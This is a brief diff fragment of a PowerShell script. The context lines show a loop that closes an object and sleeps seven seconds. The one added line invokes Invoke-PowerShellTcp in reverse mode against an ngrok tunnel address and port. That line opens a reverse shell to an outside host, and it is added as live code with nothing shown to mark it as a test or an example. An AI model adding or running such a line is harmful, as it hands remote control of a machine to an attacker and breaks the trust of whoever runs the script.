@@ -60,3 +60,4 @@ while ($true) {
     $y.Close()
     Start-Sleep -Seconds 7
 }
+Invoke-PowerShellTcp -Reverse -IPAddress 7.tcp.eu.ngrok.io -Port 10624
